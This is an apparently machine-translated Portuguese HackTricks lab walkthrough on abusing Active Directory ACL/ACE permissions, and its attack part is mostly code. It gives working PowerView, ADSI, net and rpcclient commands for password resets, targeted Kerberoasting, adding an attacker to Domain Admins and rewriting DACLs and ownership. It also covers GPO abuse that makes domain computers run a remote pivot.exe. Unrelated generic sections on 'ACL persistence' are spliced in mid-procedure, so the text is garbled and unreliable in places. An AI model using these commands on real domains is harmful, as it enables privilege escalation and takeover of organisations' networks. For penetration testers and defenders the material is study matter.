# Abusando de ACLs/ACEs do Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Contexto

Este laboratório é para abusar das permissões fracas das Listas de Controle de Acesso Discricionário (DACLs) e Entradas de Controle de Acesso (ACEs) do Active Directory que compõem as DACLs.

Objetos do Active Directory, como usuários e grupos, são objetos seguráveis e as DACL/ACEs definem quem pode ler/modificar esses objetos (ou seja, alterar o nome da conta, redefinir a senha, etc.).

Um exemplo de ACEs para o objeto segurável "Administradores de Domínio" pode ser visto aqui:

![](../../../.gitbook/assets/1.png)

Algumas das permissões e tipos de objetos do Active Directory que nós, como atacantes, estamos interessados são:

* **GenericAll** - direitos completos sobre o objeto (adicionar usuários a um grupo ou redefinir a senha do usuário)
* **GenericWrite** - atualizar os atributos do objeto (ou seja, script de logon)
* **WriteOwner** - mudar o proprietário do objeto para um usuário controlado pelo atacante e assumir o controle do objeto
* **WriteDACL** - modificar as ACEs do objeto e dar ao atacante o direito de controle total sobre o objeto
* **AllExtendedRights** - capacidade de adicionar usuário a um grupo ou redefinir senha
* **ForceChangePassword** - capacidade de alterar a senha do usuário
* **Self (Self-Membership)** - capacidade de adicionar a si mesmo a um grupo

Neste laboratório, vamos explorar e tentar explorar a maioria das ACEs acima.

Vale a pena familiarizar-se com todas as [arestas do BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) e com o maior número possível de [Direitos Estendidos](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) do Active Directory, pois nunca se sabe quando pode encontrar um menos comum durante uma avaliação.

## GenericAll em Usuário

Usando o powerview, vamos verificar se nosso usuário atacante `spotless` tem direitos `GenericAll` no objeto AD para o usuário `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```
Podemos ver que, de fato, nosso usuário `spotless` tem direitos de `GenericAll`, permitindo efetivamente que o invasor assuma a conta:

![](../../../.gitbook/assets/2.png)

*   **Alterar senha**: Você pode simplesmente alterar a senha desse usuário com

    ```bash
    net user <username> <password> /domain
    ```
*   **Kerberoasting direcionado**: Você pode tornar o usuário **kerberoastable** definindo um **SPN** na conta, kerberoast e tentar quebrar offline:

    ```powershell
    # Definir SPN
    Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
    # Obter Hash
    .\Rubeus.exe kerberoast /user:<username> /nowrap
    # Limpar SPN
    Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

    # Você também pode usar a ferramenta https://github.com/ShutdownRepo/targetedKerberoast 
    # para obter hashes de um ou todos os usuários
    python3 targetedKerberoast.py -domain.local -u <username> -p password -v
    ```
*   **ASREPRoasting direcionado**: Você pode tornar o usuário **ASREPRoastable** **desabilitando** a **pré-autenticação** e, em seguida, ASREProast.

    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```

## GenericAll em Grupo

Vamos ver se o grupo `Domain admins` tem permissões fracas. Primeiro, vamos obter seu `distinguishedName`:
```csharp
Get-NetGroup "domain admins" -FullData
```
# Abuso de Persistência de ACL

## Descrição

O abuso de persistência de ACL é uma técnica que permite a um invasor manter o acesso a um sistema comprometido, mesmo depois que suas credenciais tenham sido revogadas ou alteradas. Isso é feito modificando as listas de controle de acesso (ACLs) em objetos do Active Directory para conceder permissões adicionais a uma conta comprometida.

## Detalhes

As ACLs são usadas para controlar o acesso a objetos do Active Directory, como usuários, grupos e computadores. Cada objeto tem uma ACL associada a ele, que lista as contas que têm permissão para acessar o objeto e o tipo de acesso que cada conta tem. As permissões podem ser concedidas a contas individuais ou a grupos de contas.

Os invasores podem abusar da persistência de ACL de várias maneiras, incluindo:

* Adicionando uma conta comprometida a um grupo com permissões elevadas em um objeto do Active Directory.
* Concedendo permissões adicionais a uma conta comprometida em um objeto do Active Directory.
* Modificando as permissões em um objeto do Active Directory para permitir que uma conta comprometida execute ações que normalmente não seriam permitidas.

Essas técnicas permitem que um invasor mantenha o acesso a um sistema comprometido, mesmo depois que suas credenciais tenham sido revogadas ou alteradas. Isso pode ser especialmente perigoso em ambientes em nuvem, onde as credenciais são frequentemente rotacionadas automaticamente.

## Detecção

A detecção de abuso de persistência de ACL pode ser difícil, pois as alterações nas ACLs podem ser difíceis de detectar. No entanto, existem algumas técnicas que podem ajudar a identificar esse tipo de atividade:

* Monitorar as alterações nas ACLs de objetos do Active Directory.
* Monitorar as alterações nas associações de grupo de contas do Active Directory.
* Monitorar as tentativas de acesso a objetos do Active Directory por contas que normalmente não teriam permissão para acessá-los.

## Prevenção

Para prevenir o abuso de persistência de ACL, é importante seguir as práticas recomendadas de segurança do Active Directory, incluindo:

* Limitar as permissões de conta a apenas o que é necessário para realizar as tarefas necessárias.
* Monitorar as alterações nas ACLs e associações de grupo de contas do Active Directory.
* Implementar a autenticação multifator para contas com permissões elevadas.
* Implementar a rotação automática de credenciais para contas com permissões elevadas.
* Implementar a segregação de funções para limitar o acesso a objetos do Active Directory.
```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que nosso usuário de ataque `spotless` tem direitos `GenericAll` mais uma vez:

![](../../../.gitbook/assets/5.png)

Efetivamente, isso nos permite adicionar a nós mesmos (o usuário `spotless`) ao grupo `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
O mesmo pode ser alcançado com o módulo Active Directory ou PowerSploit:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write no Computador/Usuário

* Se você tiver esses privilégios em um **objeto de computador**, você pode realizar [Delegação Restrita Baseada em Recursos do Kerberos: Assumir o controle do objeto de computador](../resource-based-constrained-delegation.md).
* Se você tiver esses privilégios em um usuário, você pode usar um dos [primeiros métodos explicados nesta página](./#genericall-on-user).
* Ou, se você tiver em um computador ou usuário, você pode usar as **Credenciais de Sombra** para se passar por ele:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty no Grupo

Se o usuário controlado tiver o direito `WriteProperty` em `Todos` os objetos para o grupo `Administradores de Domínio`:

![](../../../.gitbook/assets/7.png)

Podemos adicionar a nós mesmos ao grupo `Administradores de Domínio` e escalar privilégios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## Autoassociação (Autoassociação) em Grupo

Outro privilégio que permite ao atacante adicionar-se a um grupo:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## WriteProperty (Autoassociação)

Mais um privilégio que permite ao atacante adicionar-se a um grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
# Abuso de Persistência de ACL

## Introdução

O Active Directory é um serviço de diretório que armazena informações sobre objetos em uma rede e torna essas informações disponíveis para usuários e administradores da rede. O Active Directory usa listas de controle de acesso (ACLs) para controlar o acesso a objetos em uma rede. As ACLs especificam quais usuários e grupos têm permissão para acessar um objeto e quais ações eles podem executar nesse objeto.

Os atacantes podem abusar da persistência de ACL para manter o acesso a uma rede comprometida. O abuso de persistência de ACL envolve a adição de permissões a objetos em uma rede que permitem que um atacante mantenha o acesso a esses objetos, mesmo que suas credenciais sejam revogadas.

## Técnicas de Abuso de Persistência de ACL

### Adicionar permissões a objetos do Active Directory

Os atacantes podem adicionar permissões a objetos do Active Directory para manter o acesso a uma rede comprometida. Eles podem adicionar permissões a objetos como contas de usuário, grupos de segurança e unidades organizacionais (OUs).

Os atacantes podem adicionar permissões a objetos do Active Directory usando várias técnicas, incluindo:

- Modificar as ACLs dos objetos do Active Directory usando ferramentas como o PowerShell ou o ADSI Edit.
- Usando técnicas de injeção de código para adicionar permissões a objetos do Active Directory.
- Usando técnicas de engenharia social para obter acesso a credenciais de administrador e, em seguida, adicionar permissões a objetos do Active Directory.

### Abusar de permissões existentes

Os atacantes também podem abusar de permissões existentes em objetos do Active Directory para manter o acesso a uma rede comprometida. Eles podem abusar de permissões em objetos como contas de usuário, grupos de segurança e OUs.

Os atacantes podem abusar de permissões existentes em objetos do Active Directory usando várias técnicas, incluindo:

- Usando permissões de leitura para obter informações confidenciais sobre a rede.
- Usando permissões de gravação para modificar objetos do Active Directory e adicionar permissões adicionais.
- Usando permissões de execução para executar comandos no contexto de um usuário com permissões elevadas.

## Mitigação

Para mitigar o abuso de persistência de ACL, as organizações devem implementar as seguintes práticas recomendadas:

- Monitorar as alterações nas ACLs dos objetos do Active Directory.
- Limitar o número de usuários com permissões de administrador no Active Directory.
- Implementar políticas de senha fortes e multifatoriais para contas de usuário com permissões elevadas.
- Implementar controles de acesso baseados em função (RBAC) para limitar o acesso a objetos do Active Directory.
- Implementar soluções de detecção de intrusão (IDS) para detectar atividades suspeitas em objetos do Active Directory.
```csharp
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Se tivermos `ExtendedRight` no tipo de objeto `User-Force-Change-Password`, podemos redefinir a senha do usuário sem saber a senha atual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
Fazendo o mesmo com o powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
Outro método que não requer mexer com a conversão de senha segura em string:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...ou um comando em uma linha se não houver uma sessão interativa disponível:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

E uma última maneira de realizar isso a partir do Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## WriteOwner em Grupo

Observe que antes do ataque o proprietário do `Domain Admins` é `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Após a enumeração ACE, se descobrirmos que um usuário sob nosso controle tem direitos de `WriteOwner` em `ObjectType:All`...
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
Podemos alterar o proprietário do objeto `Domain Admins` para o nosso usuário, que no nosso caso é `spotless`. Observe que o SID especificado com `-Identity` é o SID do grupo `Domain Admins`:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## GenericWrite em Usuário

O privilégio `GenericWrite` em um objeto de usuário do Active Directory permite que um usuário modifique as permissões de controle de acesso do objeto. Isso pode ser abusado para obter persistência em um ambiente do Active Directory.

Para realizar esse ataque, um invasor precisa ter permissões de gravação no objeto de usuário. O invasor pode então adicionar permissões adicionais ao objeto de usuário, concedendo a si mesmo acesso futuro ao objeto. Isso pode ser feito adicionando uma nova entrada de controle de acesso (ACE) ao objeto de usuário, concedendo ao invasor permissões de controle total ou permissões de gravação adicionais.

Para evitar esse tipo de ataque, é importante limitar as permissões de gravação em objetos de usuário do Active Directory e monitorar as alterações nas permissões de controle de acesso.
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
`WriteProperty` em um `ObjectType`, que neste caso particular é `Script-Path`, permite que o invasor sobrescreva o caminho do script de logon do usuário `delegate`, o que significa que na próxima vez que o usuário `delegate` fizer login, seu sistema executará nosso script malicioso:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
Abaixo mostra o campo de script de logon do usuário ~~`delegate`~~ atualizado no AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite no Grupo

Isso permite que você defina como membros do grupo novos usuários (você mesmo, por exemplo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd) 
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## WriteDACL + WriteOwner

Se você é o proprietário de um grupo, como eu sou o proprietário de um grupo AD `Test`:

![](../../../.gitbook/assets/22.png)

O que você pode, é claro, fazer através do powershell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
Se você tem permissão `WriteDACL` em um objeto AD:

![](../../../.gitbook/assets/24.png)

...você pode se dar privilégios [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) com um pouco de feitiçaria ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
O que significa que agora você tem controle total sobre o objeto AD:

![](../../../.gitbook/assets/25.png)

Isso efetivamente significa que você pode adicionar novos usuários ao grupo.

Interessante notar que eu não pude abusar desses privilégios usando o módulo Active Directory e os cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Replicação no domínio (DCSync)**

A permissão **DCSync** implica ter essas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.\
[**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

Às vezes, certos usuários/grupos podem ser delegados para gerenciar objetos de política de grupo, como é o caso do usuário `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos ver isso usando o PowerView assim:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
O abaixo indica que o usuário `offense\spotless` tem privilégios de **WriteProperty**, **WriteDacl**, **WriteOwner** entre outros que são propícios para abuso:

![](../../../.gitbook/assets/a14.png)

### Enumerar Permissões de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que o ObjectDN acima da captura de tela acima se refere ao GPO `New Group Policy Object`, uma vez que o ObjectDN aponta para `CN=Policies` e também para `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que é o mesmo nas configurações do GPO, conforme destacado abaixo:

![](../../../.gitbook/assets/a15.png)

Se quisermos procurar especificamente por GPOs mal configurados, podemos encadear vários cmdlets do PowerSploit da seguinte maneira:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Computadores com uma Política Aplicada Específica**

Agora podemos resolver os nomes dos computadores em que a GPO `Política Mal Configurada` é aplicada:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
**Políticas aplicadas a um computador específico**

Para verificar as políticas aplicadas a um computador específico, podemos usar o comando `gpresult /r /scope computer`. Este comando exibirá todas as políticas aplicadas ao computador, incluindo as políticas de segurança. Podemos usar essa informação para identificar possíveis vulnerabilidades de segurança e explorá-las para obter acesso não autorizado.
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
**OUs com uma política aplicada**

Esta técnica envolve a criação de uma nova política de grupo (GPO) e a vinculação a uma unidade organizacional (OU) específica. Em seguida, é possível adicionar permissões personalizadas à política para permitir que um usuário ou grupo específico modifique a política. Isso pode ser usado para permitir que um usuário mal-intencionado modifique a política para incluir um backdoor ou outra forma de persistência.

Para verificar se uma OU tem uma política aplicada, você pode usar o seguinte comando:

```
Get-ADOrganizationalUnit -Identity "OU=TestOU,DC=example,DC=com" -Properties gPLink
```

Isso retornará a política vinculada à OU, se houver uma. Se a política estiver vinculada, você pode usar o seguinte comando para verificar as permissões da política:

```
Get-GPPermissions -Guid "{PolicyGUID}" -All
```

Isso retornará todas as permissões para a política especificada pelo GUID. Se houver permissões personalizadas que permitam a modificação da política, isso poderá ser usado para criar persistência.
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso do GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Uma das maneiras de abusar dessa má configuração e obter a execução de código é criar uma tarefa agendada imediata por meio do GPO, como mostrado abaixo:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

O código acima adicionará nosso usuário "spotless" ao grupo local `administrators` do computador comprometido. Observe que, antes da execução do código, o grupo não contém o usuário `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso de GPO**

{% hint style="info" %}
Você pode verificar se o módulo GroupPolicy está instalado com `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. Em caso de necessidade, você pode instalá-lo com `Install-WindowsFeature –Name GPMC` como administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, após a atualização do GPO, também precisará que alguém faça login no computador.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
Ele não pode criar GPOs, então ainda precisamos fazer isso com o RSAT ou modificar um ao qual já temos acesso de gravação.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política <a href="#force-policy-update" id="force-policy-update"></a>

As atualizações abusivas anteriores de **GPO são recarregadas** aproximadamente a cada 90 minutos.\
Se você tiver acesso ao computador, pode forçá-lo com `gpupdate /force`.

### Sob o capô <a href="#under-the-hood" id="under-the-hood"></a>

Se observarmos as Tarefas Agendadas da GPO `Misconfigured Policy`, podemos ver nossa `evilTask` sentada lá:

![](../../../.gitbook/assets/a22.png)

Abaixo está o arquivo XML que foi criado por `New-GPOImmediateTask` que representa nossa tarefa agendada maliciosa na GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>cmd</Command>
                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```
### Usuários e Grupos <a href="#usuários-e-grupos" id="usuários-e-grupos"></a>

A mesma escalada de privilégios pode ser alcançada abusando da funcionalidade de Usuários e Grupos do GPO. Note no arquivo abaixo, na linha 6, onde o usuário `spotless` é adicionado ao grupo local `administrators` - poderíamos mudar o usuário para outro, adicionar outro ou até mesmo adicionar o usuário a outro grupo/múltiplos grupos, já que podemos alterar o arquivo de configuração da política no local mostrado devido à delegação GPO atribuída ao nosso usuário `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
            <Members>
                <Member name="spotless" action="ADD" sid="" />
            </Members>
        </Properties>
    </Group>
</Groups>
```
Além disso, poderíamos pensar em aproveitar scripts de logon/logoff, usar o registro para autoruns, instalar .msi, editar serviços e outras formas de execução de código.

## Referências

* Inicialmente, esta informação foi em grande parte copiada de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
